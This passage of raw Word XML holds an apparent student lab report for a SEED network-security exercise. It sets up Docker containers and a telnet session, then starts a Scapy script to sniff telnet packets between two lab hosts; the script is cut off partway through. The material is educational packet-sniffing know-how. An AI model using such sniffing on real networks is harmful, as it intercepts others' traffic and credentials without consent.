    <w:p w14:paraId="0EC61E98" w14:textId="563C5ABB" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Containers are </w:t>
      </w:r>
      <w:r w:rsidR="00761F66" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>set up</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00761F66" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here with the commands above.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2469F7" w14:textId="0D248DBE" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E5E662C" wp14:editId="14BDB323">
            <wp:extent cx="5486400" cy="1215390"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="146281047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10474" name="Picture 1" descr="A screen shot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1215390"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D4E95D" w14:textId="77777777" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig3: Inside seed-attacker container</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C3437A" w14:textId="5E170B1B" w:rsidR="00A81C71" w:rsidRPr="00C2328F" w:rsidRDefault="00A81C71" w:rsidP="00A81C71">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>Open another new terminal for this</w:t>
      </w:r>
      <w:r w:rsidR="00761F66" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. This is how to access the attacker container.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AEC720" w14:textId="2A71A03C" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00761F66">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Write Linux commands to show your attacker’s network interface name (unique network id) and ids for Host A, seed-attacker, Host B.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D86FF5" w14:textId="3CB53203" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Inside the seed attacker container terminal type the command </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5310DA67" w14:textId="710A4AA7" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The information we need is at block 4. Showing the interface name on the first line, MAC address on the second line and IP address on the third line.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C94DAA" w14:textId="36261B1A" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6EEA7C86" wp14:editId="40AE3023">
            <wp:extent cx="5486400" cy="2746375"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="495943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4389" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2746375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4248A4" w14:textId="0D6661AB" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Fig4: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Output of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578FABDC" w14:textId="77777777" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3233E8B9" w14:textId="256E9F22" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Next open a new terminal so that you are in the Ubuntu host terminal and type the command ps. You will get a table that has container name and container id like below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4898236F" w14:textId="092004C1" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C630834" wp14:editId="601E449B">
            <wp:extent cx="5486400" cy="1519555"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="137055118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51181" name="Picture 1" descr="A screen shot of a computer code&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1519555"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11ED56DB" w14:textId="08DE84D8" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="004929E4" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Fig5: Output for docker </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0619D45F" w14:textId="427B063F" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="00761F66" w:rsidP="00761F66">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Write a Python </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>program</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> using Scapy to sniff the telnet packets sent between Host A and Host B. Use Wireshark to demo your sniff successfully.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E1AC65" w14:textId="3D094E64" w:rsidR="00761F66" w:rsidRPr="00C2328F" w:rsidRDefault="002613AA" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">First, we want to connect host A and host B to send packets. Open host terminal and type </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>docker exec -it hostA-10.9.0.5 bash</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to enter Host A then type this command </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>telnet 10.9.0.6</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Next send some random text. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1045FCE9" w14:textId="316D08CF" w:rsidR="002613AA" w:rsidRPr="00C2328F" w:rsidRDefault="0018692A" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EF7AA91" wp14:editId="51225D87">
            <wp:extent cx="5486400" cy="1548130"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1215269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69450" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1548130"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6861E280" w14:textId="34604A1E" w:rsidR="004929E4" w:rsidRPr="00C2328F" w:rsidRDefault="0018692A" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig6: tele connection between host A and host B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DEC987" w14:textId="77777777" w:rsidR="0018692A" w:rsidRPr="00C2328F" w:rsidRDefault="0018692A" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7186ED4F" w14:textId="431A8485" w:rsidR="0018692A" w:rsidRPr="00C2328F" w:rsidRDefault="0018692A" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Now inside the seed attacker terminal you want to create a script to sniff packet from the connection above. First run command: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nano telnet_sniffer.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Then paste the script below, s</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ave and exit (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Ctrl+O</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Enter, then </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Ctrl+X</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E09E972" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00761F66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="152B1AFB" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import sniff, TCP, Raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B6D278" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DB523C7" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>packet_callback</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(packet):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392A6F7F" w14:textId="77777777" w:rsidR="00387AE2" w:rsidRPr="00C2328F" w:rsidRDefault="00387AE2" w:rsidP="00387AE2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>packet.haslayer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
